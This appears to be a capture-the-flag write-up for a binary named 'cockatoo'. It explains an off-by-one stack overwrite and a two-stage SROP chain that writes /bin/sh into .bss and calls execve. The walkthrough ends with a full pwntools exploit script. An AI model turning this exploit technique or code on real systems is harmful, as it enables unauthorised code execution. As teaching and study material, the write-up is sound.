# File Analysis 

[](images/file.png)
[](images/checksec.png)

As we can see it's normal ELF file but statically linked , no PIE and with canary 

# Code Analysis 

We are not introduced to many functions , so we only have the main to worry about 
[](images/ghidra.png)

This code reads input byte-by-byte from standard input until a newline or 256 characters are reached (there is no point of sending more than 256 bytes as only 256 are gonna be read ) storing it in local_118. It then writes the collected input to standard output and performs a stack integrity check using stack_chk_fail.
Then it checks if our input reaches 256 character, it will print that out 
Notice there is no format strings vulnerability so leaking the canary is out of our mind at this point .

# Looking at our ROP gadgets

Using ROPgadget, and looking through the gadgets we have we only see syscall ,and pop rax that matters 

[](images/gadgets.png)
At this point we start thinking of our vulnerability here which is SROP.
But notice here our syscall has not (ret), so this syscall is not going to benifit us, We'll search the binary itself for a syscall and we find this : 
[](images/syscall.png)


Knwoing SROP we only need syscall;ret , pop rax which now have and an address for /bin/sh or some other shell 
Searching the binary for a shell we couldn't find anything with a 0x400.. address 
[](images/bin.png)

So now we are thinking of a way to write /bin/sh into the binary, and that's possible due to the ability to write on .bss section, which can be found like this : 
[](images/vmmap.png)

the purple region is our writable space, for caution we will take 0x403000 + 100 = 0x0x403100

# Our first SROP frmae for reading
```python
POP_RAX = 0x0000000000401001
SYSCALL_RET = 0x0000000000401a8b
writable = 0x403100  # DATA section from vmmap + 0x100 for extra space 

# First SigreturnFrame for read(0, writable, 0x400)
frame = SigreturnFrame()
frame.rax = 0            # read syscall
frame.rdi = 0            # file descriptor stdin (0)
frame.rsi = writable     # where data will be stored
frame.rsp = writable     # make stack point to our writable address
frame.rdx = 0x400        # number of bytes to read
frame.rip = SYSCALL_RET  # return to syscall
```

# Canary and Stack alignment

So now we know we are using SROP to write /bin/sh then SROP to call /bin/sh , but what about the canary? 
We will start by sending 256 bytes and breaking there to examine the stack , we will set a break point at 0x00000000004011ca before the strlen being called , and hit continute 256 ( c 256 ) times so our input being read to the stack :

```python
payload = b'A' * 0x100   



payload += flat(
    POP_RAX,
    0xf,             # syscall number for sigreturn
    SYSCALL_RET,
    bytes(frame)     # the SigreturnFrame
)

# Send the first payload to read our input 
r.sendline(payload)
```

[](images/stack.png)

AS you can see, our 256 bytes + some bytes from rsi-2 + canary + rbp + ret address (our goal)

So until we reach ret address , there are \x18 bytes , notice the rbp value is 1 , so \x18 didn't work , we will use \x17 

```python
payload = b'A' * 0x100   + b'\x17' # the \x17 because we didn't reach the ret address yet 



payload += flat(
    POP_RAX,
    0xf,             # syscall number for sigreturn
    SYSCALL_RET,
    bytes(frame)     # the SigreturnFrame
)

# Send the first payload to read our input 
r.sendline(payload)
```

[](images/read.png)

from the image we see now are prompted with another read syscall :) 

# /bin/sh address calculation 

Now our seconde read we will use it to call execve with our /bin/sh (we didn't write /bin/sh yet)
we will write it after the execve syscall and locate it first
our break point will be after sending our first payload

```python
# Second SigreturnFrame for execve("/bin/sh", 0, 0)
frame2 = SigreturnFrame()
frame2.rax = 0x3b        # execve syscall
frame2.rdi = 000000    # pointer to "/bin/sh" in writable memory still unknown
frame2.rsi = 0           # argv = NULL
frame2.rdx = 0           # envp = NULL
frame2.rip = SYSCALL_RET # return to syscall

# Payload to trigger the second sigreturn frame
payload2 = flat(
    POP_RAX,
    0xf,             # syscall number for sigreturn
    SYSCALL_RET,
    bytes(frame2)
)

# Send the second payload and /bin/sh
r.sendline(payload2  + b'/bin/sh\x00')

```
notice here our new stack 
[](images/newstack.png)

hit continue again , then search for /bin/sh
[](images/binsh.png)

now we have located it , our exploit is complete we just need to call it 


# Full Exploit 


```python
from pwn import *

# Assuming the binary is called 'cockatoo'
context.binary = elf = ELF('./cockatoo')
r = process()
# gdb.attach(r,gdbscript='''b * 0x00000000004011ca''')

POP_RAX = 0x0000000000401001
SYSCALL_RET = 0x0000000000401a8b
writable = 0x403100  # DATA section from vmmap + 0x100 for extra space 

# First SigreturnFrame for read(0, writable, 0x400)
frame = SigreturnFrame()
frame.rax = 0            # read syscall
frame.rdi = 0            # file descriptor stdin (0)
frame.rsi = writable     # where data will be stored
frame.rsp = writable     # make stack point to our writable address
frame.rdx = 0x400        # number of bytes to read
frame.rip = SYSCALL_RET  # return to syscall

# Payload to trigger the first sigreturn frame
payload = b'A' * 0x100  + b'\x17' # the \x17 because I didn't reach the ret address yet 



payload += flat(
    POP_RAX,
    0xf,             # syscall number for sigreturn
    SYSCALL_RET,
    bytes(frame)     # the SigreturnFrame
)

# Send the first payload to read our input 
r.sendline(payload)
# gdb.attach(r)

# Second SigreturnFrame for execve("/bin/sh", 0, 0)
frame2 = SigreturnFrame()
frame2.rax = 0x3b        # execve syscall
frame2.rdi = 0x403210    # pointer to "/bin/sh" in writable memory
frame2.rsi = 0           # argv = NULL
frame2.rdx = 0           # envp = NULL
frame2.rip = SYSCALL_RET # return to syscall

# Payload to trigger the second sigreturn frame
payload2 = flat(
    POP_RAX,
    0xf,             # syscall number for sigreturn
    SYSCALL_RET,
    bytes(frame2)
)

# Send the second payload to execute the shell
r.sendline(payload2  + b'/bin/sh\x00')


# Interact with the spawned shell
r.interactive()
```

[](images/id.png)




